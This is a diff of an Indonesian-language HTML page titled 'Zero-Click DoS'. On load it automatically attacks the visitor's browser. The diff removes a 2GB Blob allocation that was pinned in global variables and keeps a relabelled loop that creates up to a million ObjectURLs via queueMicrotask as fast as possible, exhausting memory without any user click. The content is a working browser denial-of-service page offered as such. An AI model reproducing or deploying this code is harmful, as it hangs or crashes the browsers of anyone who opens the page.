@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Zero-Click Memory Exhaustion</title>
+<title>Zero-Click ObjectURL Leak</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
 body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; }
@@ -19,9 +19,9 @@ p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
 
 <body>
 <div class="panel" id="main-panel">
-    <div class="warning">⚠️ PERINGATAN: Halaman ini akan langsung memicu Memory Exhaustion saat dibuka!</div>
+    <div class="warning">⚠️ PERINGATAN: Halaman ini akan langsung memicu Memory Leak saat dibuka!</div>
     <h1>Zero-Click DoS</h1>
-    <p>Membuat Blob raksasa dan jutaan ObjectURL tanpa henti.</p>
+    <p>Membuat jutaan ObjectURL tanpa henti.</p>
     
     <div id="status" role="status">Memuat halaman...</div>
     <div class="log" id="log">Log akan muncul di sini...</div>
@@ -38,27 +38,10 @@ p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
 
     // FUNGSI ZERO-CLICK: Langsung eksekusi saat halaman dimuat
     window.addEventListener("DOMContentLoaded", () => {
-        statusDiv.textContent = "MEMULAI SERANGAN DoS...";
+        statusDiv.textContent = "MEMULAI OBJECTURL LEAK...";
         statusDiv.style.color = "#ff4444";
-        log("Halaman dimuat. Memulai alokasi memori masif...");
+        log("Halaman dimuat. Memulai pembuatan ObjectURL masif...");
 
-        // --- SERANGAN 1: Blob Raksasa (2GB) ---
-        try {
-            const sizeInBytes = 2 * 1024 * 1024 * 1024; // 2GB
-            const buffer = new ArrayBuffer(sizeInBytes);
-            const blob = new Blob([buffer], { type: 'application/octet-stream' });
-            const url = URL.createObjectURL(blob);
-            
-            // Simpan di global agar tidak di-GC
-            window.hugeBlob = blob;
-            window.hugeBlobUrl = url;
-            
-            log("Blob 2GB berhasil dialokasikan.");
-        } catch (e) {
-            log("Gagal alokasi Blob 2GB: " + e.message);
-        }
-
-        // --- SERANGAN 2: Jutaan ObjectURL (Memory Leak) ---
         let count = 0;
         const targetCount = 1000000; // 1 Juta URL
 
@@ -84,7 +67,7 @@ p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
                     log("URL ke-" + count + " dibuat.");
                 }
                 
-                // Loop secepat mungkin
+                // Loop secepat mungkin menggunakan Microtask
                 queueMicrotask(createURL);
             } catch (e) {
                 log("Gagal di URL ke-" + count + ": " + e.message);
@@ -93,7 +76,7 @@ p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
             }
         }
 
-        // Mulai Memory Leak
+        // Mulai eksekusi
         createURL();
     });
 </script>
